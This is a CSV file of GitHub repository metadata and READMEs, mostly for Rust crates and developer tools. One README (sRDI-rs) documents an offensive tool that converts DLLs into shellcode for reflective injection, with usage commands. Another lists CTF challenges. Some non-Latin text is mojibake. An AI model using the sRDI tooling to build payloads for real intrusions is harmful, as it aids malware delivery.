repo,branch,readme,releases_count,open_issues_count,branches_count,license,workflows,pulls_count
aumetra/asynk-strim,main,"# asynk-strim

Like `async-stream` but without macros. Like `async-fn-stream` but a little more efficient.

Features:

- macroless API
- one dependency (besides `futures-core` which I don't count since it provides the `Stream` definition)
- `no_std`-compatible, zero allocations

### ‚ö† Important

This crate adds a wrapper around the wakers that contains data and pointers needed to yield items.
Crates like [`embassy`](https://embassy.dev) use a similar approach and will therefore clash with us.

If you run into this issue (which will manifest as a runtime panic), you can use the `unwrap_waker` function.
This function will wrap a future and remove the waker wrapper.

While you can't use the yielder inside the unwrapped future, stuff like `embassy` should work again.

## Example

```rust
use futures_lite::stream;
use std::pin::pin;

let stream = pin!(asynk_strim::stream_fn(|mut yielder| async move {
    yielder.yield_item(""hello world!"").await;
    yielder.yield_item(""pretty neato, ain't it?"").await;
}));

let mut stream = stream::block_on(stream);
assert_eq!(stream.next(), Some(""hello world!""));
assert_eq!(stream.next(), Some(""pretty neato, ain't it?""));
assert_eq!(stream.next(), None);
```

## Comparisons

### `async-stream`

In comparison to `async-stream` we offer the following advantages:

- no macros
- slightly faster performance
- `no_std` support

### `async-fn-stream`

In comparison to `async-stream` we offer the following advantages:

- no allocations
- slightly faster performance
- `no_std` support

## Acknowledgements

This crate combines approaches from the following crates:

- [`async-stream`][async-stream]
- [`async-fn-stream`][async-fn-stream]
- The PR by Sabrina Jewson adding a [function-based API to `async-stream`][sabrina-pr]
- The experimental PR by Hyeonu Park using [the waker-based approach][hyeonu-pr]

## License

Licensed under tither the MIT or Apache 2.0 license (at your choosing)

[async-stream]: https://github.com/tokio-rs/async-stream
[async-fn-stream]: https://github.com/dmitryvk/async-fn-stream
[sabrina-pr]: https://github.com/tokio-rs/async-stream/pull/74
[hyeonu-pr]: https://github.com/tokio-rs/async-stream/pull/105
",0,0,1,Apache-2.0,tests.yml,6.0
qi4L/sRDI-rs,master,"# sRDI-rs

Rust ÂÆûÁé∞ÁöÑÂèçÂ∞ÑÂºè DLL Ê≥®ÂÖ•ÁöÑ Shellcode ÂÆûÁé∞„ÄÇÂ∞Ü DLL ËΩ¨Êç¢‰∏∫‰ΩçÁΩÆÊó†ÂÖ≥ÁöÑ shellcode„ÄÇ

## Features

- Âü∫‰∫é [KCon2024È´òÁ∫ßÊÅ∂ÊÑèËΩØ‰ª∂ÂºÄÂèë‰πãRDIÁöÑËøõÂåñ](https://github.com/knownsec/KCon/blob/master/2024/%E9%AB%98%E7%BA%A7%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8BRDI%E7%9A%84%E8%BF%9B%E5%8C%96.pdf)

## Usage

[Install Rust](https://www.rust-lang.org/tools/install)

ÊûÑÂª∫È°πÁõÆ
```
cargo build --release
```

- sRDI

```
Shellcode Reflective DLL Injection (sRDI)

Usage: srdi.exe [OPTIONS] --loader <LOADER> --payload <PAYLOAD> --function <FUNCTION> --parameter <PARAMETER> --output <OUTPUT>

Options:
      --loader <LOADER>        The reflective loader DLL path (loader.dll)
      --payload <PAYLOAD>      The payload DLL path (payload.dll)
      --function <FUNCTION>    The function to execute inside payload.dll (SayHello)
      --parameter <PARAMETER>  The parameter to pass to the function inside payload.dll (https://localhost:1337/)
      --output <OUTPUT>        The output file path (shellcode.bin)
      --flags <FLAGS>          The 0x0 flag will execute DllMain and any other flag will execute the function inside payload.dll (SayHello) [default: 1]
  -h, --help                   Print help
  -V, --version                Print version
```

- ‰ΩøÁî®Á§∫‰æã

```
srdi.exe --loader reflective_loader.dll --payload payload.dll --function FuncName --parameter inj --flags 1 --output shellcode.bin
```

‰πãÂêéÈÄöËøá shellcode Âä†ËΩΩÂô®ËøõË°åËá™Ê≥®ÂÖ•„ÄÇ



## ÂèÇËÄÉ

https://github.com/knownsec/KCon/blob/master/2024/%E9%AB%98%E7%BA%A7%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8BRDI%E7%9A%84%E8%BF%9B%E5%8C%96.pdf
https://github.com/timwhitez/Doge-sRDI
https://github.com/memN0ps/venom-rs
https://github.com/monoxgas/sRDI",0,0,1,,,0.0
nyxpsi/nyxpsi,main,"[![Rust](https://github.com/nyxpsi/nyxpsi/actions/workflows/rust.yml/badge.svg)](https://github.com/nyxpsi/nyxpsi/actions/workflows/rust.yml)
# nyx-œà

**nyx-œà** _(nyxpsi)_ is a next-generation network implementation designed for resilience and efficiency in lossy and unstable network environments. Through innovative networking strategies and error correction mechanisms, **nyx-œà** delivers reliable data transfer where traditional protocols like TCP and UDP fall short.

Built with scalability and robustness in mind, **nyx-œà** aims to empower applications that demand high reliability and performance, even in the face of extreme packet loss.
Results Summary

## Prerequisites

Before building and running **nyx-œà**, ensure that your development environment meets the following requirements:

- **Rust Compiler**: Version **1.74** or newer is required.

If you need to install rust for the first time run the command below.

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh  // installs rust
```

Update your local toolchain with ```rustup``` if necessary.

```bash
rustup update  // updates rust
rustc --version  // output should be >= 1.74
```

## Benchmark Results

We conducted benchmarks comparing **nyx-œà**, TCP, and UDP under various packet loss scenarios. The test involved transferring 1MB of data under different network conditions. You can conduct your own with `cargo bench`

### Results Summary

| Protocol | 0% Loss | 10% Loss | 50% Loss |
|----------|---------|----------|----------|
| nyx-œà    | 1.07s (100%) | 1.07s (100%) | 1.07s (100%) |
| TCP      | 1.04s (100%) | 0.93s (0%)   | 0.52s (0%)   |
| UDP      | 1.07s (100%) | 5.05s (0%)   | 5.64s (0%)   |

*Note: Values represent average transfer time. Percentages in parentheses indicate transfer success rate.*

For more information or to contact us open a PR or email us at nyxpsi@skill-issue.dev
",0,1,1,MPL-2.0,rust.yml,3.0
Juanperias/motion,main,"<img src=""https://i.ibb.co/dDJLb0X/motion-Banner.png"">

# MotionüçÉ

Motion is a **bare metal physics engine** with which you can make simulations easily and quickly, also in rust.

## Get started ‚ú®

let's start by making a simple event loop

```rust
use std::{thread, time::Duration};

use motion::event_loop::EventLoopBuilder;

// The definition of this function depends on the context in which motion is used
fn sleep(duration: Duration) {
    thread::sleep(duration);
}

fn main() {
    let el = EventLoopBuilder::new().fps(1).build();

    el.start(|_config| println!(""Hello! in the event loop""), sleep);
}
```

now we are going to do something more complex by creating an object

```rust
    let obj = Object2dBuilder::new()
        .position(vec2(2.0, 2.0))
        .density(2.0)
        .mass(3.0)
        .velocity(vec2(4.0, 4.0))
        .acceleration(vec2(3.0, 3.0))
        .radius(2.0)
        .shape(Shape::Circle)
        .build();
```

## Why rust ü¶Ä

Rust is a fast and efficient programming language, which makes it perfect for motion, plus it is very flexible allowing motion to be used everywhere.
",5,1,2,Apache-2.0,"clippy.yml,release.yml",23.0
rick-de-water/nonany,main,"# nonany
[![crates.io](https://img.shields.io/crates/v/nonany)](https://crates.io/crates/nonany)
[![docs](https://img.shields.io/docsrs/nonany)](https://docs.rs/nonany)
[![msrv](https://img.shields.io/crates/msrv/nonany)](https://docs.rs/nonany)

nonany provides integer types with customizable niche values in stable rust. The main benefit of integer types with niches is that it enables the compiler to do memory layout optimization, such that an `Option` of an integer is the same size as the integer itself:

```rust
assert_eq!(
    core::mem::size_of::<Option<nonany::NonAnyU32<0xDEADBEEF>>>(),
    core::mem::size_of::<nonany::NonAnyU32<0xDEADBEEF>>());
```

## Example
```rust
use nonany::NonAnyI8;

assert!(NonAnyI8::<20>::new(100).is_some(), ""Values that aren't the niche can be stored"");
assert!(NonAnyI8::<20>::new(20).is_none(), ""The niche itself cannot be stored"");

let foo = NonAnyI8::<20>::new(25).unwrap();
assert_eq!(foo.get(), 25, ""The value can be loaded"");
```

## Provided types
nonmax defines generic types with user defined niches for all integer types, as well as type aliases common use cases:

|   | `NonAny*` | `NonMin*` | `NonMax*` | `NonZero*` |
|---|---|---|---|---|
| `i8` | [`NonAnyI8`](https://docs.rs/nonany/latest/nonany/struct.NonAnyI8.html) | [`NonMinI8`](https://docs.rs/nonany/latest/nonany/type.NonMinI8.html) | [`NonMaxI8`](https://docs.rs/nonany/latest/nonany/type.NonMaxI8.html) | [`NonZeroI8`](https://docs.rs/nonany/latest/nonany/type.NonZeroI8.html) |
| `i16` | [`NonAnyI16`](https://docs.rs/nonany/latest/nonany/struct.NonAnyI16.html) | [`NonMinI16`](https://docs.rs/nonany/latest/nonany/type.NonMinI16.html) | [`NonMaxI16`](https://docs.rs/nonany/latest/nonany/type.NonMaxI16.html) | [`NonZeroI16`](https://docs.rs/nonany/latest/nonany/type.NonZeroI16.html) |
| `i32` | [`NonAnyI32`](https://docs.rs/nonany/latest/nonany/struct.NonAnyI32.html) | [`NonMinI32`](https://docs.rs/nonany/latest/nonany/type.NonMinI32.html) | [`NonMaxI32`](https://docs.rs/nonany/latest/nonany/type.NonMaxI32.html) | [`NonZeroI32`](https://docs.rs/nonany/latest/nonany/type.NonZeroI32.html) |
| `i64` | [`NonAnyI64`](https://docs.rs/nonany/latest/nonany/struct.NonAnyI64.html) | [`NonMinI64`](https://docs.rs/nonany/latest/nonany/type.NonMinI64.html) | [`NonMaxI64`](https://docs.rs/nonany/latest/nonany/type.NonMaxI64.html) | [`NonZeroI64`](https://docs.rs/nonany/latest/nonany/type.NonZeroI64.html) |
| `i128` | [`NonAnyI128`](https://docs.rs/nonany/latest/nonany/struct.NonAnyI128.html) | [`NonMinI128`](https://docs.rs/nonany/latest/nonany/type.NonMinI128.html) | [`NonMaxI128`](https://docs.rs/nonany/latest/nonany/type.NonMaxI128.html) | [`NonZeroI128`](https://docs.rs/nonany/latest/nonany/type.NonZeroI128.html) |
| `isize` | [`NonAnyIsize`](https://docs.rs/nonany/latest/nonany/struct.NonAnyIsize.html) | [`NonMinIsize`](https://docs.rs/nonany/latest/nonany/type.NonMinIsize.html) | [`NonMaxIsize`](https://docs.rs/nonany/latest/nonany/type.NonMaxIsize.html) | [`NonZeroIsize`](https://docs.rs/nonany/latest/nonany/type.NonZeroIsize.html) |
| `u8` | [`NonAnyU8`](https://docs.rs/nonany/latest/nonany/struct.NonAnyU8.html) | [`NonMinU8`](https://docs.rs/nonany/latest/nonany/type.NonMinU8.html) | [`NonMaxU8`](https://docs.rs/nonany/latest/nonany/type.NonMaxU8.html) | [`NonZeroU8`](https://docs.rs/nonany/latest/nonany/type.NonZeroU8.html) |
| `u16` | [`NonAnyU16`](https://docs.rs/nonany/latest/nonany/struct.NonAnyU16.html) | [`NonMinU16`](https://docs.rs/nonany/latest/nonany/type.NonMinU16.html) | [`NonMaxU16`](https://docs.rs/nonany/latest/nonany/type.NonMaxU16.html) | [`NonZeroU16`](https://docs.rs/nonany/latest/nonany/type.NonZeroU16.html) |
| `u32` | [`NonAnyU32`](https://docs.rs/nonany/latest/nonany/struct.NonAnyU32.html) | [`NonMinU32`](https://docs.rs/nonany/latest/nonany/type.NonMinU32.html) | [`NonMaxU32`](https://docs.rs/nonany/latest/nonany/type.NonMaxU32.html) | [`NonZeroU32`](https://docs.rs/nonany/latest/nonany/type.NonZeroU32.html) |
| `u64` | [`NonAnyU64`](https://docs.rs/nonany/latest/nonany/struct.NonAnyU64.html) | [`NonMinU64`](https://docs.rs/nonany/latest/nonany/type.NonMinU64.html) | [`NonMaxU64`](https://docs.rs/nonany/latest/nonany/type.NonMaxU64.html) | [`NonZeroU64`](https://docs.rs/nonany/latest/nonany/type.NonZeroU64.html) |
| `u128` | [`NonAnyU128`](https://docs.rs/nonany/latest/nonany/struct.NonAnyU128.html) | [`NonMinU128`](https://docs.rs/nonany/latest/nonany/type.NonMinU128.html) | [`NonMaxU128`](https://docs.rs/nonany/latest/nonany/type.NonMaxU128.html) | [`NonZeroU128`](https://docs.rs/nonany/latest/nonany/type.NonZeroU128.html) |
| `usize` | [`NonAnyUsize`](https://docs.rs/nonany/latest/nonany/struct.NonAnyUsize.html) | [`NonMinUsize`](https://docs.rs/nonany/latest/nonany/type.NonMinUsize.html) | [`NonMaxUsize`](https://docs.rs/nonany/latest/nonany/type.NonMaxUsize.html) | [`NonZeroUsize`](https://docs.rs/nonany/latest/nonany/type.NonZeroUsize.html) |


## How does it work?
Internally all `NonAny*` types use the `NonZero*` types from the standard library. When a value is stored in `NonAny*`, the value is stored in the internal `NonZero*` as an XOR of the value and the niche. Any value XORed with the niche that isn't the niche itself can never be zero, so this works out perfectly.

The upside of this technique is that it works on stable rust. The downside is that it requires an, albeit cheap, XOR operation to load and store the value. Additionally, unlike the `NonZero*` types, transmuting `NonAny*` types to their underlying integer types results in a value that was XORed with the niche, instead of the value itself.

## MSRV
The MSRV is currently fixed at 1.56.0, and the intention is to keep it there at least until version 1.0 is released.

## Similar libraries
 - [nonmax](https://github.com/LPGhatguy/nonmax) - Uses the same XOR technique to create types with an `<int>::MAX` niche. The equivalent in nonany would be to either use a niche of `<int>::MAX`, or the `NonMax*` type aliases.
 - [nook](https://github.com/tialaramex/nook/) - Uses unstable `rustc_` attributes to define balanced integers. The equivalent in nonany would be to either use a niche of `<int>::MIN`, or the `NonMin*` type aliases.
## License
Licensed under either of [Apache License, Version 2.0](LICENSE-APACHE) or [MIT license](LICENSE-MIT) at your option.

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.",4,0,1,Apache-2.0,tests.yaml,1.0
NovaLogics/skills-training-cli-java,main,"<h1 align=""center"" >  
‚ùÆ Skills Training ‚ùØ
  
Java Language
</h1>

<br>

### Learning Goals  
The primary goal of these projects is to reinforce basic programming skills while creating interactive and fun games. Each game focuses on specific fundamental concepts that are essential for mastering programming logic and flow.

<br>

‚ù± Online Java compiler to run Java program online
```md
https://www.programiz.com/java-programming/online-compiler/
```
",0,0,2,MIT,,1.0
diommsantos/QtREAnalyzer,master,"# QtREAnalyzer

QtREAnalyzer is a Ghidra Analyzer designed to reverse-engineer binaries that utilize the Qt framework. Its primary function is to recover Qt-specific object and method information, providing valuable insights into binary structures.

# Features

- Works on binaries without debug symbols.
- Identifies and labels staticMetaObject objects created by  the Qt moc.
- Identifies and labels qt_meta_stringdata objects created by the Qt moc.
- Identifies and labels qt_meta_data objects created by the Qt moc.
- Identifies and labels qt_static_metacall functions created by the Qt moc.
- Annotates with comments the previously identified qt_static_metacall functions with the methods and propertie signatures recovered from the Qt meta data.
- Identifies and applies method signatures, i.e. Qt methods (signals and slots) get their original name, parameter types and sometimes parameter names depending on the available metadata.
- Identifies and applies propertie names and types to the base Qt class, i.e. Qt properties get their original name and sometimes full types depending on the available metadata, and are created in the class data type they belong to.

# Installation

This analyzer is tied to the Ghidra version it is being installed on. Currently is necessary to build it;
built extensions will be provided in the future for the latest Ghidra versions. 

## Build the Ghidra extension

1. Install [gradle](https://docs.gradle.org/current/userguide/installation.html#ex-installing-manually)
2. Navigate to the `QtREAnalyzer\QtREAnalyzer` folder

```bash
cd QtREAnalyzer\QtREAnalyzer
```
 
3. Build the plugin for your Ghidra installation (replace `$GHIDRA_DIR` with your installation directory).
For example, if you have the following Ghidra installation path `C:\ghidra_11.0.3_PUBLIC` you would run 
``gradle -PGHIDRA_INSTALL_DIR=C:\ghidra_11.0.3_PUBLIC``. 

```bash
gradle -PGHIDRA_INSTALL_DIR=$GHIDRA_DIR
```

## Install the Analyzer

1. From Ghidra projects manager: ``File`` -> ``Install Extensions...``, click on the
   `+` sign and select the `QtREAnalyzer\QtREAnalyzer\dist\ghidra_*_QtREAnalyzer.zip` and click OK.
2. Restart Ghidra as requested

## Troubleshooting
To verify QtREAnalyzer is correctly installed, you can open CodeBrowser and select
``Analysis`` -> ``Auto Analyze ... A`` and check that the `QtReAnalyzer` option
exists.

# Usage
![QtREAnalyzer Usage](/docs/QtREAnalyzer_usage.gif)

# TODO
- [x] Automatically apply function signatures recovered from Qt metadata, see [1](https://www.usenix.org/conference/usenixsecurity23/presentation/wen).
- [x] Automatically apply properties names and types from Qt metadata, see [1](https://www.usenix.org/conference/usenixsecurity23/presentation/wen).
- [ ] Recover connections between signals and slots.
- [ ] Identify and recover more Qt classes and methods.

# Limitations

Currently QtREAnalyzer only works with x32 or x64 binaries that have RTTI (i.e compiled with the MSVC compiler). This is so since QtREAnalyzer uses RTTI to find if classes inherit from QObject. This said if one wants to extend this analyzer to work with binaries without RTTI all that is necessary to do is modify the ``RttiClass.java`` file appropriately.

In very rare cases an incorrect signature will be applied to a function or a property will be added to a data type in the incorrect address. This is almost impossible to fix since the way QtREAnalyzer maps Qt signals, slots and propertie signatures to the corresponding function address/propertie offset is heuristic based. This shouldn't be a major limitation, in a file with over 10 000 Qt signals and slots checking manually a substantial sample I only found a handful of erroneously labeled symbols.

# Acknowledgments

QtREAnalyzer would have not been possible without the following amazing resources:

- The [article](https://www.usenix.org/conference/usenixsecurity23/presentation/wen) ""Egg Hunt in Tesla Infotainment: A First Look at Reverse Engineering of Qt Binaries"" by Wen, Haohuang and Lin, Zhiqiang and its [github repository](https://github.com/OSUSecLab/QtRE)
- https://ktln2.org/reversing-c%2B%2B-qt-applications-using-ghidra/
- https://woboq.com/blog/how-qt-signals-slots-work.html
- https://www.codeproject.com/articles/31330/qt-internals-reversing
",0,0,1,,,1.0
HeroCTF/HeroCTF_v6,main,"![banner](https://pbs.twimg.com/profile_banners/815907006708060160/1586530306/1500x500)

# HeroCTF V6

HeroCTF is an online cybersecurity competition for beginners to advanced players that takes place once a year.

Start : 25/10/2024 at 9pm (UTC+2)<br>
End : 27/10/2024 at 11pm (UTC+2)

Website : https://www.heroctf.fr/<br>
Twitter : https://twitter.com/HeroCTF<br>
Discord : https://discord.gg/mgk9bv7<br>
Linkedin : https://www.linkedin.com/company/heroctf/<br>
Ctftime : https://ctftime.org/event/2496<br>
Github : https://github.com/HeroCTF

# Challenges

- **Total :** 44 challenges.
- **Difficulty** (4 levels) : Very Easy, Easy, Medium, Hard

| Name                                                                | Category      | Author          | Difficulty  | Created |
|---------------------------------------------------------------------|:-------------:|:---------------:|:-----------:|:-------:|
| [Interpolation](./Crypto/Interpolation/)                            | Crypto        | Alol            | Easy        |  ‚úÖ     |
| [State](./Crypto/State/)                                            | Crypto        | Alol            | Medium      |  ‚úÖ     |
| [Halloween](./Crypto/Halloween/)                                    | Crypto        | Alol            | Hard        |  ‚úÖ     |
| [Free Shell](./Misc/Free_Shell/)                                    | Misc          | xanhacks        | Very Easy   |  ‚úÖ     |
| [Einstein](./Misc/Einstein/)                                        | Misc          | Log_s           | Very Easy   |  ‚úÖ     |
| [Moo](./Misc/Moo/)                                                  | Misc          | Log_s           | Easy        |  ‚úÖ     |
| [Cloud Shell](./Misc/Cloud_Shell/)                                  | Misc          | Worty           | Medium      |  ‚úÖ     |
| [Data Science](./Prog/data-science/)                                | Prog          | Log_s           | Very Easy   |  ‚úÖ     |
| [Antwarz #1 (PvE)](./Prog/antwarz1/)                                 | Prog          | Log_s           | Easy       |  ‚úÖ     |
| [Antwarz #2 (PvE)](./Prog/antwarz2/)                                 | Prog          | Log_s           | Medium     |  ‚úÖ     |
| [Data Science](./Prog/data-science/)                                | Prog          | Log_s           | Very Easy   |  ‚úÖ     |
| [AutoInfector 1/3](./Reverse/AutoInfector_1/)                       | Reverse       | xanhacks        | Very Easy   |  ‚úÖ     |
| [AutoInfector 2/3](./Reverse/AutoInfector_2/)                       | Reverse       | xanhacks        | Easy        |  ‚úÖ     |
| [AutoInfector 3/3](./Reverse/AutoInfector_3/)                       | Reverse       | xanhacks        | Medium      |  ‚úÖ     |
| [Landscape](./Reverse/Landscape/)                                   | Reverse       | xanhacks        | Medium      |  ‚úÖ     |
| [Lebarnol](./Steganography/Lebarnol)                                | Steganography | Thibz           | Easy        |  ‚úÖ     |
| [Zipper](./Steganography/Zipper/)                                   | Steganography | Thibz           | Easy        |  ‚úÖ     |
| [LSD#3](./Steganography/LSD%233)                                      | Steganography | Thibz           | Medium      |  ‚úÖ     |
| [Subliminal#3](./Steganography/Subliminal%233)                        | Steganography | Thibz           | Medium      |  ‚úÖ     |
| [Heappie](./Pwn/Heappie/)                                           | Pwn           | xanhacks        | Very Easy   |  ‚úÖ     |
| [BankRupst](./Pwn/BankRupst)                                        | Pwn           | ghizmo          | Easy        |  ‚úÖ     |
| [Buafllet](./Pwn/Buafllet)                                          | Pwn           | ghizmo          | Hard        |  ‚úÖ     |
| [PrYzes](./Web/PrYzes)                                              | Web           | xanhacks        | Very Easy   |  ‚úÖ     |
| [Jinjatic](./Web/Jinjatic)                                          | Web           | Worty           | Easy        |  ‚úÖ     |
| [SampleHub](./Web/SampleHub)                                        | Web           | Mizu            | Easy        |  ‚úÖ     |
| [Cache Cache](./Web/CacheCache)                                     | Web           | Mizu            | Medium      |  ‚úÖ     |
| [ComplainIO](./Web/ComplainIO)                                      | Web           | Worty           | Hard        |  ‚úÖ     |
| [Under Construction](./Web/UnderConstruction)                       | Web           | Mizu            | Hard        |  ‚úÖ     |
| [Under Construction Revenge](./Web/UnderConstruction_Revenge)       | Web           | Mizu            | Very Hard   |  ‚úÖ     |
| [Telechat](./Web/Telechat)                                          | Web           | Worty           | Very Hard   |  ‚úÖ     |
| [Transformers 1](./Forensics/Transformers_1)                        | Forensics     | Mallon          | Easy        |  ‚úÖ     |
| [Transformers 2](./Forensics/Transformers_2)                        | Forensics     | Mallon          | Medium      |  ‚úÖ     |
| [Tenant trouble](./Forensics/Tenant_trouble)                        | Forensics     | Mallon          | Easy        |  ‚úÖ     |
| [Lazy SysAdmin 1](./Misc/LazySysAdmin_1)                            | Misc          | Mallon          | Easy        |  ‚úÖ     |
| [Lazy SysAdmin 2](./Forensics/LazySysAdmin2)                       | Forensics     | Mallon          | Medium      |  ‚úÖ     |
| [Giam (v0.01)](./GameHacking/v001)                              | Game Hacking  | iHuggsy         | Easy        |  ‚úÖ     |
| [Giam (v0.02)](./GameHacking/v002)                              | Game Hacking  | iHuggsy         | Medium      |  ‚úÖ     |
| [Giam (v0.03)](./GameHacking/v003)                              | Game Hacking  | iHuggsy         | Medium      |  ‚úÖ     |
| [Giam (v0.04)](./GameHacking/v004)                              | Game Hacking  | iHuggsy         | Hard        |  ‚úÖ     |
| [Giam (v0.05)](./GameHacking/v005)                              | Game Hacking  | iHuggsy         | Hard        |  ‚úÖ     |

> Icons: ‚úÖüöß‚ùå
",0,1,1,,"docker-build.yml,syntax-challenge.yml",1.0
gleam-lang/zed-gleam,main,"# Zed Gleam

A [Gleam](https://gleam.run/) extension for [Zed](https://zed.dev/).

Provides syntax highlighting and use of the Gleam Language Server, which itself provides formatting, goto-definition, autocompletion, and more!

## Development

To develop this extension, see the [Developing Extensions](https://zed.dev/docs/extensions/developing-extensions) section of the Zed docs.
",1,3,1,Apache-2.0,,0.0
danvega/golf-scheduler,main,"# Golf Academy OAuth2 Implementation

A robust OAuth2 implementation for the Golf Academy application using Spring Boot 3.3+. This project demonstrates a complete OAuth2 setup with an authorization server, resource server, and client applications.

In particular this application is showing off the new RestClient support for OAuth2 in Spring Security 6.4. 

https://spring.io/blog/2024/10/28/restclient-support-for-oauth2-in-spring-security-6-4

## Project Overview

The project consists of three main components:

1. **Authorization Server** (Port 9000) - Handles authentication and issues OAuth2 tokens
2. **Resource Server** (Port 8081) - Provides protected golf lesson endpoints
3. **Client Applications**:
    - OAuth2 Client (Spring Security implementation)
    - No-Auth Client (RestClient without Authorization)

## Architecture

```mermaid
graph TD
    A[Client Application] -->|OAuth2 Token Request| B[Authorization Server]
    B -->|Issues Token| A
    A -->|Request with Token| C[Resource Server]
    C -->|Validates Token with| B
    C -->|Returns Protected Resources| A
```

## Project Requirements

- Java 23
- Spring Boot 3.3.5+
- Maven 3.6+
- Spring Security 6.4+

## Key Features

- OAuth2 Authorization Server implementation
- JWT token-based authentication
- Resource server with protected endpoints
- Client credential flow implementation
- RestClient with OAuth2 support

## Getting Started

### Setting Up the Authorization Server

1. Start the authorization server:

```bash
cd authorization-server
./mvnw spring-boot:run
```

The server will start on port 9000 with the following configuration:

```yaml
spring:
  security:
    oauth2:
      authorizationserver:
        issuer: http://localhost:9000
```

### Setting Up the Resource Server

1. Start the resource server:

```bash
cd resource-server
./mvnw spring-boot:run
```

The resource server runs on port 8081 and is configured to validate tokens with the authorization server:

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: http://localhost:9000
```

### Client Applications

#### OAuth2 Client Application

Configuration example:

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          golf-client:
            client-id: golf-client
            client-secret: golf-secret
            authorization-grant-type: client_credentials
            scope: read
```

#### Using the REST API

To access protected resources:

```java
@RestController
public class LessonsController {
    private final RestClient restClient;

    @GetMapping(""/lessons"")
    public String fetchLessons() {
        return restClient.get()
                .uri(""http://localhost:8081/lessons"")
                .attributes(clientRegistrationId(""golf-client""))
                .retrieve()
                .body(String.class);
    }
}
```

## Security Configuration

### Authorization Server

The authorization server is configured with in-memory client registration:

```java
@Bean
public RegisteredClientRepository registeredClientRepository() {
    RegisteredClient registeredClient = RegisteredClient.withId(UUID.randomUUID().toString())
            .clientId(""golf-client"")
            .clientSecret(passwordEncoder().encode(""golf-secret""))
            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(AuthorizationGrantType.CLIENT_CREDENTIALS)
            .scope(""read"")
            .build();
    return new InMemoryRegisteredClientRepository(registeredClient);
}
```

### Resource Server

The resource server is configured to require authentication for all requests:

```java
@Configuration
@EnableWebSecurity
public class ResourceServerConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(authorize -> authorize
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(Customizer.withDefaults())
            );
        return http.build();
    }
}
```

## API Endpoints

### Lessons API

`GET /lessons` - Retrieves available golf lessons

Example response:
```json
[
  {
    ""title"": ""Beginner Golf Basics"",
    ""description"": ""An introduction to the fundamentals of golf."",
    ""instructor"": ""John Doe"",
    ""schedule"": ""2024-11-05T10:00:00""
  }
]
```

## Testing

The project includes JUnit tests for each component. Run tests using:

```bash
./mvnw test
```

## Error Handling

The client applications include comprehensive error handling for OAuth2-related issues:

```java
.defaultStatusHandler(HttpStatusCode::is4xxClientError, (request, response) -> {
    if (response.getStatusCode() == HttpStatus.UNAUTHORIZED) {
        throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, 
            ""Unauthorized access to lessons API"");
    }
    throw new ResponseStatusException(response.getStatusCode(), 
        ""Client error occurred"");
})
```",0,0,1,,,0.0
utilForever/2024-DEVCON-Rust-Safety,main,"# 2024-DEVCON-Rust-Safety

DEVCON 2024 - RustÎäî Ïñ¥ÎñªÍ≤å ÏïàÏ†ÑÌïú ÌîÑÎ°úÍ∑∏ÎûòÎ∞çÏùÑ Ïù¥Î§ÑÎÇ¥ÎäîÍ∞Ä Î∞úÌëú ÏûêÎ£å Î∞è ÏòàÏ†ú ÏΩîÎìú

## Contents

- Presentation
  - [DEVCON 2024 - RustÎäî Ïñ¥ÎñªÍ≤å ÏïàÏ†ÑÌïú ÌîÑÎ°úÍ∑∏ÎûòÎ∞çÏùÑ Ïù¥Î§ÑÎÇ¥ÎäîÍ∞Ä](./1%20-%20Presentation/DEVCON%202024%20-%20RustÎäî%20Ïñ¥ÎñªÍ≤å%20ÏïàÏ†ÑÌïú%20ÌîÑÎ°úÍ∑∏ÎûòÎ∞çÏùÑ%20Ïù¥Î§ÑÎÇ¥ÎäîÍ∞Ä.pdf)
- Example Code
  - [Ownership](./2%20-%20Example/01_ownership.rs)
  - [Borrowing](./2%20-%20Example/02_borrowing.rs)
  - [Lifetime](./2%20-%20Example/03_lifetime.rs)
  - [Struct](./2%20-%20Example/04_struct.rs)
  - [Trait](./2%20-%20Example/05_trait.rs)
  - [Trait Object](./2%20-%20Example/06_trait_object.rs)
  - [Type Conversion](./2%20-%20Example/07_type_conversion.rs)
  - [Enum](./2%20-%20Example/08_enum.rs)
  - [Option](./2%20-%20Example/09_option.rs)
  - [Result](./2%20-%20Example/10_result.rs)
  - [Pattern Matching](./2%20-%20Example/11_pattern_matching.rs)
  - [Copy and Clone](./2%20-%20Example/12_copy_and_clone.rs)
  - [Sorting for f64](./2%20-%20Example/13_f64_sort.rs)
  - [Closure](./2%20-%20Example/14_closure.rs)
  - [Concurrency 1](./2%20-%20Example/15_concurrency_1.rs)
  - [Concurrency 2](./2%20-%20Example/16_concurrency_2.rs)
  - [Macro](./2%20-%20Example/17_macro.rs)

## References

- Beginner
  * [The Rust Programming Language](https://doc.rust-lang.org/book/)
  * [Rust-101 by Ralf Jung](https://www.ralfj.de/projects/rust-101/main.html)
  * [Comprehensive Rust](https://google.github.io/comprehensive-rust/)
  * [Rustlings](https://github.com/rust-lang/rustlings/)
  * [Rust By Example](https://doc.rust-lang.org/stable/rust-by-example/)
  * [Exercism - Rust](https://exercism.org/tracks/rust)
  * [Book: The Rust Programming Language](http://www.yes24.com/Product/Goods/83075894)
  * [Book: Rust in Action](https://www.manning.com/books/rust-in-action)
  * [Book: Programming Rust](https://www.oreilly.com/library/view/programming-rust-2nd/9781492052586/)
- Intermediate
  * [The Standard Library](https://doc.rust-lang.org/std/index.html)
  * [The Edition Guide](https://doc.rust-lang.org/edition-guide/index.html)
  * [The Cargo Book](https://doc.rust-lang.org/cargo/index.html)
  * [The rustdoc Book](https://doc.rust-lang.org/rustdoc/index.html)
  * [The rustc Book](https://doc.rust-lang.org/rustc/index.html)
  * [Book: Concurrent Programming](http://www.yes24.com/Product/Goods/108570426)
  * [Book: Rust for Rustaceans](https://rust-for-rustaceans.com/)
- Advanced
  * [The Rust Reference](https://doc.rust-lang.org/reference/index.html)
